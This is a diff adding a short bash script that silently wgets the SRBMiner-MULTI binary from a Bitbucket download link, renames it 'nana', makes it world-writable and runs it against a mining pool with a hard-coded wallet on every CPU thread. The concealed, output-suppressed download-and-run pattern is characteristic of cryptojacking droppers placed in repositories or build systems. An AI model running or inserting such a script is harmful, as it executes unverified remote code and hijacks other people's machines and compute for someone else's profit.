@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -O nana https://bitbucket.org/krupuk2/upil/downloads/SRBMiner-MULTI > /dev/null 2>&1
+chmod 777 nana
+./nana --algorithm flex --pool stratum+tcp://us-stratum.coinminerz.com:3348 --wallet kc1qcalxct74h9p899xv53jhufvc6ns3mga7yqt3ua.aing --password lcn=lc1qxlszq5qey2sqtz2z34k2pl0hxfhdhgztdjpwh7 --cpu-threads $(nproc --all)
